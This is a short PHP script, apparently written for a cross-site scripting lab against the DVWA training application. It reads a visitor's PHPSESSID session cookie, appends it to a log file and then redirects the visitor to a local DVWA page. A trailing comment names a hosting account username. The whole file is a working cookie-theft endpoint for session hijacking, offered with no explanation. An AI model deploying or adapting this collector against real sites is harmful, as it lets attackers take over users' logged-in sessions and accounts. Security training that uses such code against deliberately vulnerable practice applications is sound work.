<?php
$file = fopen('log.txt', 'a') or exit('Cannot access to this file');


$cookieTaken = $_COOKIE['PHPSESSID'];

fwrite($file, 'cookie: ' . $cookieTaken . PHP_EOL);

fclose($file);

header("location: http://localhost:8888/DVWA-master/index.php");


//username epiz_27628104
?>